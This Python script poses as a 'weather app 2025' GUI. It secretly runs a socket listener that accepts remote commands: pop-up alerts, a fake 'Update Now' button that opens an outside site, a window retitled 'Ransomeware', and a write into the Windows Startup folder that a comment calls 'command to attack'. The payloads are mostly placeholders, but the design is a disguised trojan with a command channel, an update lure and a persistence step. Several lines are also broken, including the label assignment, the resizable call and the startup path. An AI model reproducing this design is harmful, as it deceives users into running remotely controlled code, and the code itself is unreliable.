from tkinter import *
import socket , threading
from tkinter import messagebox
import webbrowser, os

def start_server():
    threading.Thread(target=Message_in,daemon=True).start()

def Message_in():
    with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as server_socket:
        server_socket.bind(('localhost',12345))
        server_socket.listen(1)
        zakarya_socket, addr = server_socket.accept()
        with zakarya_socket :
            while True:
                message = zakarya_socket.recv(1024).decode('utf-8')
                if message:
                    msg(message)


def msg(message):
    if message == 'alert':
        show_alert()
    if message == 'update':
        update_btn()
    if message == 'ransome':
        ransome()
    if message == "start":
        # command to attack
        create_startup()
    else:
        pass
def open_google():
    webbrowser.open('https://www.google.com')

def show_alert():
    messagebox.showinfo("Alert", "This is An Alert Message: ")
    #messagebox.showinfo('Zaka','zakarya')
def ransome():
    root.geometry('900x600')
    root.title('Ransomeware')
    root.resizable(False)

def update_btn():
    up = Button(root, text='Update Now',command=opensite)
    up.pack(pady=10)
    label.config(text= 'New Update Found v2')

def create_startup():
    startup_path = os.path.expandvars(r"%AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
    file_path = os.path.join(startup_path, "startup_message.txt")
    with open(file_path, "w", encoding="utf-8") as file:
        file.write("This file is created for startup testing.\n")
        
def opensite():
    webbrowser.open('https://facebook.net')

def create_gui():
    global root , label
    root = Tk()
    root.title('weather app 2025')
    root.geometry('420x320')
    label = Label(root,text='welcome to my weather app 2025').pack()
    start_server()
    root.mainloop()

if __name__ == '__main__':
    create_gui()